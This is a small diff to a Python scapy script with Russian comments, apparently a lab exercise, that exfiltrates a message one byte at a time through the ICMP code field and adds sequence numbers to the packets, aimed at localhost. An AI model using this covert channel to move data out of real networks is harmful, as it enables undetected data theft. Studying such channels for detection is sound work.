@@ -9,11 +9,10 @@ from scapy.all import *
 # так происходит потому что система генерирует echo reply, 
 # и каждый пакет является одновременно входящим и выходящим
 
-
 def transmit(message, host):
-    for m in message:
+    for i, m in enumerate(message):
         # в ICMP есть поле code, будем эксфильтрировать по 1 байту
-        packet = IP(dst = host) / ICMP(code = ord(m))
+        packet = IP(dst = host) / ICMP(code = ord(m), seq = i)
         send(packet)
 
 host = "127.0.0.1"
